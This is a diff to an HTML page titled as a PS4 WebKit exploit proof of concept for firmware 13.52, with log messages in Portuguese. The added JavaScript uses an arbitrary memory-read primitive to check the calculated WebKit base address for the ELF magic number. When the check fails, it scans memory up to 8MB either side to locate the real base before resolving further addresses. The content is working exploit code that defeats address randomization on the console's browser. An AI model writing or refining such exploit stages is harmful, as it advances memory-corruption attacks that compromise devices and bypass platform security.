@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — Notification PoC)</title>
+<title>PS4 WebKit Exploit (13.52 — Notification PoC 2)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -606,12 +606,55 @@ async function main() {
     const resolvedBaseVal = ctor - hc;
     const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
     const baseLo = resolvedBaseVal - baseHi * 0x100000000;
-    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
+    let webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
 
-    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
-    setCard('c-wk', '0x' + webkitBase.toString(16));
+    log('[+] Candidato WebKit Base (ctor-0x' + hc.toString(16) + '): 0x' + webkitBase.toString(16), 'a');
+    setCard('c-wk', '0x' + webkitBase.toString(16) + '?');
 
     setTimeout(async () => {
+      // Valida / corrige a base procurando ELF magic
+      try {
+        const candMagic = p.read4(webkitBase) >>> 0;
+        log('[*] Magic no candidato: 0x' + candMagic.toString(16));
+
+        if (candMagic !== 0x464C457F) {
+          log('[!] Candidato sem ELF magic — varrendo ±8MB...', 'w');
+          let found = null;
+          for (let step = 0; step <= 0x800000 && !found; step += 0x1000) {
+            for (const sign of (step === 0 ? [1] : [1, -1])) {
+              try {
+                const test = sign > 0 ? webkitBase.add32(step) : webkitBase.sub32(step);
+                if ((p.read4(test) >>> 0) === 0x464C457F) {
+                  found = test;
+                  log('[+] ELF magic em 0x' + found.toString(16) +
+                      ' (delta=' + (sign > 0 ? '+' : '-') + '0x' + step.toString(16) + ')', 'ok');
+                  break;
+                }
+              } catch (e) {}
+            }
+            if ((step & 0x1FFFF) === 0 && step) await new Promise(r => setTimeout(r, 0));
+          }
+          if (found) {
+            webkitBase = found;
+          } else {
+            log('[-] ELF magic não encontrado perto do candidato.', 'e');
+            log('[*] Possível causa: OFFSET 0x' + hc.toString(16) + ' errado para este build', 'w');
+            setStatus('WebKit base inválida', 'e');
+            setCard('c-wk', 'inválida');
+            return;
+          }
+        } else {
+          log('[+] ELF magic OK no candidato', 'ok');
+        }
+      } catch (e) {
+        log('[-] Erro ao validar WebKit base: ' + (e && e.message ? e.message : e), 'e');
+        setStatus('Erro na base WebKit', 'e');
+        return;
+      }
+
+      log('[+] WebKit Base final: 0x' + webkitBase.toString(16), 'ok');
+      setCard('c-wk', '0x' + webkitBase.toString(16));
+
       let result;
       try {
         result = await resolveAllBases(p, webkitBase);
